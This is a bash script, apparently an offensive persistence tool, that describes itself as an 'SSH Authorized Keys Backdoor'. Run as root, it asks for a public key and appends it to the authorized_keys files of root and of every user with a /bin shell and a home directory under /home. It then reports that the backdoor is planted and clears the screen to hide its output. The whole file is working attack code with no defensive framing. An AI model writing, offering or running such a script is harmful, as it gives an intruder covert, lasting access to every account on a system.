#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] SSH Authorized Keys Backdoor [*] "
echo ""
echo "This plants your SSH public key into all users' authorized_keys files."
echo ""

read -p "Paste your SSH public key (full line): " pubkey

if [ -z "$pubkey" ]; then
    echo "[ERROR] No public key provided." >&2
    exit 1
fi

count=0

# Add to root
mkdir -p /root/.ssh
chmod 700 /root/.ssh
if ! grep -qF "$pubkey" /root/.ssh/authorized_keys 2>/dev/null; then
    echo "$pubkey" >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    echo "[+] Added key to root"
    count=$((count + 1))
fi

# Add to all users with valid shells
while IFS=':' read -r username _ uid _ _ home shell; do
    if [[ "$shell" =~ /bin/.* ]] && [[ "$home" =~ ^/home/[^/]+$ ]] && [ -d "$home" ]; then
        mkdir -p "$home/.ssh"
        chmod 700 "$home/.ssh"

        if ! grep -qF "$pubkey" "$home/.ssh/authorized_keys" 2>/dev/null; then
            echo "$pubkey" >> "$home/.ssh/authorized_keys"
            chmod 600 "$home/.ssh/authorized_keys"
            chown -R "$username:$username" "$home/.ssh"
            echo "[+] Added key to $username ($home)"
            count=$((count + 1))
        else
            echo "[=] Key already exists for $username"
        fi
    fi
done < /etc/passwd

clear

echo "[*] Success!! SSH authorized_keys backdoor planted for $count user(s). [*]"
echo "[*] You can now SSH as any of those users with your private key. [*]"

sleep 2

clear
